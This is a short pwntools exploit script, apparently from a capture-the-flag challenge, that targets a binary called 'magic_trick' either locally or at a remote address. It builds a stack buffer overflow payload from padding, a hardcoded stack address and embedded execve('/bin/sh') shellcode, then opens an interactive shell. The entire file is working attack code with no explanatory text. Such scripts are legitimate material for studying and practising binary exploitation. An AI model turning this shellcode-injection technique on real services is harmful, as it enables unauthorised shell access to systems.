from pwn import *

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = "./magic_trick"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'
shellcode = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

io = start()

padding = 72

payload = flat(
    b"A" * padding,
    0x7fffffffdd80,
    b"A" * 40,
    shellcode,
    0x0
)

write('payload', payload)

io.sendlineafter(b">>", b"a")
io.sendlineafter(b">>", payload)
io.interactive()